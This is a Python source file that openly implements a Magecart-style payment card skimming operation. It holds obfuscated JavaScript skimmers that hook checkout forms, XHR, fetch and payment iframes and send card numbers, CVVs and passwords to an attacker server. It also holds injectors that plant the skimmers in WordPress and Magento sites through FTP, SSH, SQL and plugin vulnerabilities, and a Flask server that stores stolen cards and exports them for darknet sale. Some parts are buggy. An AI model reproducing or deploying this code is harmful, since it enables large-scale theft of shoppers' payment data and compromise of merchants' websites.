#!/usr/bin/env python3
"""
Skimmer deployment and data collection system
Complete Python implementation
"""

import os
import re
import json
import time
import base64
import hashlib
import sqlite3
import requests
import paramiko
import mysql.connector
from datetime import datetime
from cryptography.fernet import Fernet
from flask import Flask, request, jsonify

# ============= PART 1: SKIMMER SCRIPT GENERATOR =============

class SkimmerGenerator:
    """Generates obfuscated JavaScript skimmer code"""
    
    def __init__(self, webhook_url, exfil_server):
        self.webhook = webhook_url
        self.exfil_server = exfil_server
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
    
    def generate_skimmer(self, template_type="full"):
        """Generate different skimmer variants"""
        
        variants = {
            "minimal": self._minimal_skimmer(),
            "standard": self._standard_skimmer(),
            "advanced": self._advanced_skimmer(),
            "stealth": self._stealth_skimmer()
        }
        
        script = variants.get(template_type, self._standard_skimmer())
        obfuscated = self._obfuscate(script)
        return obfuscated
    
    def _minimal_skimmer(self):
        return f"""
        (function(){{
            let d=[];
            document.querySelectorAll('form').forEach(f=>{{
                f.addEventListener('submit',()=>{{
                    let n=f.querySelector('[name*=number]')?.value;
                    let e=f.querySelector('[name*=exp]')?.value;
                    let c=f.querySelector('[name*=cvv]')?.value;
                    if(n) fetch('{self.exfil_server}/c',{{method:'POST',body:JSON.stringify({{n,e,c}}),mode:'no-cors'}});
                }});
            }});
        }})();
        """
    
    def _standard_skimmer(self):
        return f"""
        (function() {{
            const webhook = "{self.webhook}";
            let stolen = [];
            
            function capture() {{
                const inputs = {{
                    card: document.querySelector('input[name*="number"], input[name*="card"]'),
                    expiry: document.querySelector('input[name*="exp"], input[name*="expiry"]'),
                    cvv: document.querySelector('input[name*="cvv"], input[name*="cvc"]'),
                    name: document.querySelector('input[name*="name"], input[name*="holder"]')
                }};
                
                if(inputs.card && inputs.card.value.length > 12) {{
                    const data = {{
                        card: inputs.card.value,
                        expiry: inputs.expiry?.value || '',
                        cvv: inputs.cvv?.value || '',
                        name: inputs.name?.value || '',
                        url: window.location.href,
                        ua: navigator.userAgent,
                        time: new Date().toISOString()
                    }};
                    stolen.push(data);
                    
                    fetch(webhook, {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify(data),
                        mode: 'no-cors'
                    }});
                    
                    inputs.card.value = '';
                }}
            }}
            
            setInterval(capture, 2000);
            document.querySelectorAll('form').forEach(f => f.addEventListener('submit', capture));
        }})();
        """
    
    def _advanced_skimmer(self):
        """Captures AJAX checkout, Stripe/PayPal frames, and autofill"""
        return f"""
        (function() {{
            const server = "{self.exfil_server}";
            let cards = [];
            
            // Hook XMLHttpRequest
            const XHR = XMLHttpRequest.prototype;
            const open = XHR.open;
            const send = XHR.send;
            
            XHR.open = function(method, url) {{
                this._url = url;
                return open.apply(this, arguments);
            }};
            
            XHR.send = function(body) {{
                if (body && (this._url.includes('payment') || this._url.includes('charge'))) {{
                    try {{
                        const data = JSON.parse(body);
                        if (data.number || data.card_number) {{
                            fetch(server + '/xhr', {{
                                method: 'POST',
                                body: body,
                                mode: 'no-cors'
                            }});
                        }}
                    }} catch(e) {{}}
                }}
                return send.apply(this, arguments);
            }};
            
            // Hook fetch API
            const originalFetch = window.fetch;
            window.fetch = function(url, options) {{
                if (options?.body && (url.includes('payment') || url.includes('stripe'))) {{
                    fetch(server + '/fetch', {{method: 'POST', body: options.body, mode: 'no-cors'}});
                }}
                return originalFetch.apply(this, arguments);
            }};
            
            // Monitor Stripe iframe
            const stripeInterval = setInterval(() => {{
                const iframes = document.querySelectorAll('iframe');
                iframes.forEach(iframe => {{
                    try {{
                        const doc = iframe.contentDocument || iframe.contentWindow.document;
                        const inputs = doc.querySelectorAll('input');
                        inputs.forEach(input => {{
                            if (input.value.match(/\\d{{15,16}}/)) {{
                                fetch(server + '/iframe', {{method: 'POST', body: input.value, mode: 'no-cors'}});
                            }}
                        }});
                    }} catch(e) {{}}
                }});
            }}, 3000);
        }})();
        """
    
    def _stealth_skimmer(self):
        """Only activates on non-admin pages, random delay, logs to localStorage"""
        return f"""
        (function() {{
            if (window.location.href.includes('wp-admin') || window.location.href.includes('/admin')) return;
            if (localStorage.getItem('skimmer_loaded')) return;
            localStorage.setItem('skimmer_loaded', 'true');
            
            let buffer = [];
            const server = "{self.exfil_server}";
            
            function sendBatch() {{
                if (buffer.length === 0) return;
                const batch = buffer.splice(0, buffer.length);
                navigator.sendBeacon(server + '/batch', JSON.stringify(batch));
            }}
            
            setInterval(sendBatch, randomInt(30000, 60000));
            
            function randomInt(min, max) {{
                return Math.floor(Math.random() * (max - min + 1)) + min;
            }}
            
            document.addEventListener('input', function(e) {{
                const el = e.target;
                if (el.matches && el.matches('input[type*="password"], input[name*="card"], input[name*="cvv"]')) {{
                    buffer.push({{
                        v: el.value,
                        t: Date.now(),
                        id: el.name || el.id
                    }});
                }}
            }});
        }})();
        """
    
    def _obfuscate(self, script):
        """Basic obfuscation - base64 + eval wrapper"""
        encoded = base64.b64encode(script.encode()).decode()
        obfuscated = f"eval(atob('{encoded}'));"
        # Add junk code
        junk = f"var _0x{hashlib.md5(str(time.time()).encode()).hexdigest()[:6]} = function(){{return 1+1;}};"
        return junk + obfuscated


# ============= PART 2: INJECTION ENGINE =============

class WordPressInjector:
    """Inject skimmer into WordPress sites"""
    
    def __init__(self, target_sites):
        self.targets = target_sites
        self.skimmer_code = None
    
    def set_skimmer(self, code):
        self.skimmer_code = code
    
    def inject_via_ftp(self, host, username, password, port=21):
        """Upload skimmer to theme footer.php via FTP"""
        from ftplib import FTP
        
        results = []
        for target in self.targets:
            try:
                ftp = FTP(host)
                ftp.login(username, password)
                
                # Find active theme
                ftp.cwd('/wp-content/themes/')
                themes = ftp.nlst()
                
                for theme in themes:
                    try:
                        ftp.cwd(f'{theme}')
                        files = ftp.nlst()
                        if 'footer.php' in files:
                            # Download footer.php
                            with open('temp_footer.php', 'wb') as f:
                                ftp.retrbinary(f'RETR footer.php', f.write)
                            
                            # Inject skimmer
                            with open('temp_footer.php', 'r') as f:
                                content = f.read()
                            
                            if 'var skimmer' not in content:
                                injection = f"<script>{self.skimmer_code}</script>\n"
                                content = content.replace('</body>', injection + '</body>')
                                
                                with open('temp_footer.php', 'w') as f:
                                    f.write(content)
                                
                                # Upload back
                                with open('temp_footer.php', 'rb') as f:
                                    ftp.storbinary(f'STOR footer.php', f)
                                
                                results.append({'site': host, 'theme': theme, 'status': 'injected'})
                        ftp.cwd('..')
                    except:
                        continue
                
                ftp.quit()
                os.remove('temp_footer.php')
            except Exception as e:
                results.append({'site': host, 'error': str(e)})
        
        return results
    
    def inject_via_sql(self, db_host, db_user, db_pass, db_name):
        """Inject via SQL into wp_options or wp_posts"""
        connection = mysql.connector.connect(
            host=db_host, user=db_user, password=db_pass, database=db_name
        )
        cursor = connection.cursor()
        
        # Inject into active plugins option
        injection = f"a:1{{i:0;s:19:'skimmer.php'}}"
        cursor.execute(f"UPDATE wp_options SET option_value = '{injection}' WHERE option_name = 'active_plugins'")
        
        # Or inject into theme mods
        cursor.execute(f"SELECT option_value FROM wp_options WHERE option_name = 'theme_mods_*'")
        result = cursor.fetchone()
        if result:
            mods = json.loads(result[0])
            mods['custom_js'] = self.skimmer_code
            cursor.execute(f"UPDATE wp_options SET option_value = %s WHERE option_name = 'theme_mods_*'", 
                         (json.dumps(mods),))
        
        connection.commit()
        cursor.close()
        connection.close()
        return {'injected': True}
    
    def inject_via_plugin_vuln(self, site_url, vulnerable_plugin, exploit_data):
        """Use known plugin vulnerabilities"""
        endpoints = {
            'wp-file-manager': f'{site_url}/wp-content/plugins/wp-file-manager/connector.minimal.php?cmd=upload',
            'duplicator': f'{site_url}/wp-admin/admin-ajax.php?action=duplicator_download&file=',
            'elementor': f'{site_url}/wp-json/elementor/v1/globals'
        }
        
        endpoint = endpoints.get(vulnerable_plugin)
        if not endpoint:
            return None
        
        # Upload skimmer as .php file
        skimmer_php = f"<?php {self.skimmer_code} ?>"  # Convert JS to PHP eval
        response = requests.post(endpoint, files={'file': ('wp-js.php', skimmer_php)})
        
        return {'status': response.status_code, 'injected': response.status_code == 200}


class MagentoInjector:
    """Inject skimmer into Magento 2 sites"""
    
    def inject_via_layout_xml(self, ssh_host, ssh_user, ssh_key_path, theme_path):
        """Inject via layout XML files over SSH"""
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ssh_host, username=ssh_user, key_filename=ssh_key_path)
        
        # Path to default.xml in theme
        layout_path = f"{theme_path}/Magento_Theme/layout/default.xml"
        
        sftp = ssh.open_sftp()
        
        # Download layout file
        sftp.get(layout_path, 'temp_layout.xml')
        
        # Inject skimmer script
        with open('temp_layout.xml', 'r') as f:
            content = f.read()
        
        injection = f"""
        <referenceContainer name="after.body.start">
            <block class="Magento\\Framework\\View\\Element\\Template" name="skimmer" template="Magento_Theme::skimmer.phtml" />
        </referenceContainer>
        """
        
        content = content.replace('</body>', injection + '</body>')
        
        with open('temp_layout.xml', 'w') as f:
            f.write(content)
        
        sftp.put('temp_layout.xml', layout_path)
        
        # Upload skimmer template
        template_content = f"<script>{self.skimmer_code}</script>"
        with open('skimmer.phtml', 'w') as f:
            f.write(template_content)
        
        sftp.put('skimmer.phtml', f"{theme_path}/Magento_Theme/templates/skimmer.phtml")
        
        sftp.close()
        ssh.close()
        
        return {'injected': True}
    
    def inject_via_database(self, db_config, store_id=1):
        """Inject via core_config_data table"""
        connection = mysql.connector.connect(**db_config)
        cursor = connection.cursor()
        
        # Add custom script to miscellaneous HTML
        cursor.execute("""
            INSERT INTO core_config_data (scope, scope_id, path, value)
            VALUES ('stores', %s, 'design/head/includes', %s)
            ON DUPLICATE KEY UPDATE value = %s
        """, (store_id, f"<script>{self.skimmer_code}</script>", f"<script>{self.skimmer_code}</script>"))
        
        # Clear cache
        cursor.execute("TRUNCATE TABLE cache")
        cursor.execute("TRUNCATE TABLE cache_tag")
        
        connection.commit()
        cursor.close()
        connection.close()
        
        return {'injected': True}


# ============= PART 3: DATA COLLECTION SERVER =============

class SkimmerServer:
    """Flask server to receive stolen card data"""
    
    def __init__(self, host='0.0.0.0', port=5000):
        self.app = Flask(__name__)
        self.host = host
        self.port = port
        self.db_path = 'stolen_cards.db'
        self._setup_routes()
        self._init_db()
    
    def _init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS cards
                     (id INTEGER PRIMARY KEY,
                      card_number TEXT,
                      expiry TEXT,
                      cvv TEXT,
                      cardholder TEXT,
                      url TEXT,
                      user_agent TEXT,
                      ip TEXT,
                      timestamp TEXT,
                      processed INTEGER DEFAULT 0)''')
        c.execute('''CREATE TABLE IF NOT EXISTS logs
                     (id INTEGER PRIMARY KEY,
                      raw_data TEXT,
                      received_at TEXT)''')
        conn.commit()
        conn.close()
    
    def _setup_routes(self):
        
        @self.app.route('/c', methods=['POST'])
        @self.app.route('/collect', methods=['POST'])
        def collect():
            data = request.get_data(as_text=True)
            ip = request.remote_addr
            
            try:
                parsed = json.loads(data)
                if isinstance(parsed, dict):
                    self._save_card(parsed, ip)
                elif isinstance(parsed, list):
                    for item in parsed:
                        self._save_card(item, ip)
            except:
                self._save_raw(data, ip)
            
            return '', 204
        
        @self.app.route('/xhr', methods=['POST'])
        @self.app.route('/fetch', methods=['POST'])
        @self.app.route('/iframe', methods=['POST'])
        def alternative_endpoints():
            return collect()
        
        @self.app.route('/batch', methods=['POST'])
        def batch():
            data = request.get_data(as_text=True)
            items = json.loads(data)
            for item in items:
                self._save_card(item, request.remote_addr)
            return '', 204
        
        @self.app.route('/cards', methods=['GET'])
        def view_cards():
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute("SELECT * FROM cards ORDER BY id DESC LIMIT 100")
            cards = c.fetchall()
            conn.close()
            return jsonify([{
                'card_number': c[1],
                'expiry': c[2],
                'cvv': c[3],
                'cardholder': c[4],
                'url': c[5],
                'ip': c[7],
                'timestamp': c[8]
            } for c in cards])
        
        @self.app.route('/export', methods=['GET'])
        def export():
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute("SELECT card_number, expiry, cvv, cardholder FROM cards WHERE processed=0")
            cards = c.fetchall()
            
            # Format for darknet market (CSV)
            output = "card_number|expiry|cvv|cardholder\n"
            for card in cards:
                output += f"{card[0]}|{card[1]}|{card[2]}|{card[3]}\n"
            
            c.execute("UPDATE cards SET processed=1 WHERE processed=0")
            conn.commit()
            conn.close()
            
            return output
    
    def _save_card(self, data, ip):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        # Extract common patterns
        card_num = self._extract_card(data)
        expiry = self._extract_expiry(data)
        cvv = self._extract_cvv(data)
        cardholder = data.get('name', data.get('cardholder', ''))
        
        c.execute("""INSERT INTO cards 
                     (card_number, expiry, cvv, cardholder, url, user_agent, ip, timestamp)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                  (card_num, expiry, cvv, cardholder,
                   data.get('url', ''),
                   data.get('ua', data.get('user_agent', '')),
                   ip,
                   datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
        
        # Trigger validation and bin lookup
        self._validate_card(card_num, expiry, cvv)
    
    def _save_raw(self, data, ip):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("INSERT INTO logs (raw_data, received_at) VALUES (?, ?)",
                  (data, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    def _extract_card(self, data):
        patterns = ['number', 'card_number', 'card', 'cc', 'ccnumber']
        for key in patterns:
            if key in data:
                val = data[key]
                # Remove spaces and dashes
                cleaned = re.sub(r'[\s-]', '', str(val))
                if cleaned.isdigit() and 13 <= len(cleaned) <= 19:
                    return cleaned
        return ''
    
    def _extract_expiry(self, data):
        patterns = ['expiry', 'exp', 'expiration', 'exp_date', 'mm_yy']
        for key in patterns:
            if key in data:
                val = data[key]
                # Match MM/YY, MMYY, MM-YY
                match = re.search(r'(\d{1,2})[/\-]?(\d{2})', str(val))
                if match:
                    return f"{match.group(1).zfill(2)}/{match.group(2)}"
        return ''
    
    def _extract_cvv(self, data):
        patterns = ['cvv', 'cvc', 'verification', 'security_code']
        for key in patterns:
            if key in data:
                val = data[key]
                if str(val).isdigit() and 3 <= len(str(val)) <= 4:
                    return str(val)
        return ''
    
    def _validate_card(self, card_num, expiry, cvv):
        """Check if card is live using free BIN checker or test transaction"""
        if len(card_num) < 13:
            return
        
        # BIN lookup (first 6 digits)
        bin_prefix = card_num[:6]
        
        # Free BIN API
        try:
            response = requests.get(f'https://lookup.binlist.net/{bin_prefix}', timeout=5)
            if response.status_code == 200:
                bin_data = response.json()
                # Log bank, country, card type for pricing
                with open('validated_cards.txt', 'a') as f:
                    f.write(f"{card_num}|{expiry}|{cvv}|{bin_data.get('bank',{}).get('name','')}|{bin_data.get('country',{}).get('name','')}\n")
        except:
            pass
    
    def run(self):
        self.app.run(host=self.host, port=self.port, threaded=True)


# ============= PART 4: MAIN EXECUTION =============

def main():
    # Configuration
    WEBHOOK = "https://your-discord-webhook.com/api/webhooks/123"
    EXFIL_SERVER = "https://your-vps.com:5000"
    
    # Generate skimmer
    generator = SkimmerGenerator(WEBHOOK, EXFIL_SERVER)
    skimmer_code = generator.generate_skimmer("standard")
    
    print(f"[+] Generated skimmer ({len(skimmer_code)} bytes)")
    print(f"[+] Obfuscated code:\n{skimmer_code[:200]}...")
    
    # Deploy to targets
    wp_targets = [
        {'ftp_host': 'target1.com', 'ftp_user': 'admin', 'ftp_pass': 'password123'},
        {'ftp_host': 'target2.com', 'ftp_user': 'wp_user', 'ftp_pass': 'secret456'}
    ]
    
    injector = WordPressInjector(wp_targets)
    injector.set_skimmer(skimmer_code)
    
    for target in wp_targets:
        result = injector.inject_via_ftp(target['ftp_host'], target['ftp_user'], target['ftp_pass'])
        print(f"[+] Injection result: {result}")
    
    # Start collection server
    server = SkimmerServer(host='0.0.0.0', port=5000)
    print("[+] Server listening on port 5000")
    server.run()


if __name__ == "__main__":
    main()